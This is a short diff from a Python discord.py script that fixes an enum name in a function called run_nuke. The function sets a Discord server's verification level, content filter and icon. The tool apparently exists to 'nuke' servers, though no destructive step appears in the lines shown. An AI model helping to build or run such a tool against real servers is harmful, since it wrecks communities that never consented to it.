@@ -289,7 +289,7 @@ async def run_nuke(guild: discord.Guild) -> None:
             kwargs["default_notifications"] = discord.NotificationLevel.all_messages
         if VERIF_HIGH:
             kwargs["verification_level"] = discord.VerificationLevel.highest
-            kwargs["explicit_content_filter"] = discord.ExplicitContentFilter.all_members
+            kwargs["explicit_content_filter"] = discord.ContentFilter.all_members
         if GUILD_ICON_URL:
             try:
                 kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
